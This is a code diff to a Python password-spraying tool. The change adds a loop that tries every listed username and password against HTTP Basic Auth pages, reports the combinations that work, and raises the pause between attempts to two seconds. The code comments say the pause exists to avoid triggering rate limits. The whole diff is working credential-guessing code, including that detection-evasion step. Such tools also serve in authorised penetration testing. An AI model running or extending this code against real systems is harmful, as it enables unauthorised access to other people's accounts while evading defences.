@@ -124,7 +124,7 @@ def is_password_requested_basic_auth(url, session):
 
         # Check if the response is a 401 Unauthorized indicating BasicAuth is needed
         if response.status_code == 401:
-            print(f"BasicAuth required on {url}")
+            print(f"{Fore.GREEN}BasicAuth required on {url}")
             return True
         else:
             print(f"No BasicAuth required on {url}")
@@ -321,7 +321,7 @@ def password_spraying(ip_address, username_file, password_file, criteria):
         full_url = urljoin(base_url, page)
 
         # Check if the page has a password field (form-based authentication)
-        if is_password_requested_basic_password_field(full_url, session):
+        if is_password_requested_basic_password_field (full_url, session):
             for password in passwords:
                 for username in usernames:
                     
@@ -337,12 +337,37 @@ def password_spraying(ip_address, username_file, password_file, criteria):
                         else:
                             print(f"{Fore.RED}Failed login attempt for {username} on {full_url}.")
                             failed_cracks.append((full_url, username, password))
-                        # Sleep for 0.5 second between attempts to avoid triggering rate limits
-                        time.sleep(0.5)
+                        # Sleep for 2 seconds between attempts to avoid triggering rate limits
+                        time.sleep(2)
                     except (Timeout, ConnectionError):
                         print(f"Connection failed for {full_url}")
                     except RequestException as e:
                         print(f"An error occurred: {e}")
+                        
+        if is_password_requested_basic_auth(full_url, session):
+            for password in passwords:
+                for username in usernames:
+                    try:
+                        # Attempt Basic Authentication
+                        print(f"{Fore.WHITE}Trying BasicAuth with username: {username} and password: {password}")
+                        
+                        response = session.get(full_url, auth=HTTPBasicAuth(username, password))
+
+                        # Check if the login was successful
+                        if response.status_code == 200:
+                            print(f"{Fore.GREEN}Success! BasicAuth credentials: Username: {username}, Password: {password} on {full_url}")
+                            successful_cracks.append((full_url, username, password))
+                        else:
+                            print(f"{Fore.RED}Failed BasicAuth login attempt for {username} on {full_url}.")
+                            failed_cracks.append((full_url, username, password))
+                        # Sleep to avoid triggering rate limits
+                        time.sleep(2)
+                    except (Timeout, ConnectionError):
+                        print(f"Connection failed for {full_url}")
+                    except RequestException as e:
+                        print(f"An error occurred: {e}")
+
+        
 
     # Summary of cracking attempts
     print("\n--- Summary of Cracking Attempts ---")
@@ -398,7 +423,7 @@ def extract_failure_reason(html_content):
     
     # If no specific error messages are found, provide a fallback snippet from the page
     if not error_texts:
-        return soup.get_text(strip=True)[:200]  # Return the first 200 characters of the page content as a fallback
+        return soup.get_text(strip=True)[:600]  # Return the first 600 characters of the page content as a fallback
     
     # Join the extracted error messages into a single string
     return ' | '.join(error_texts)
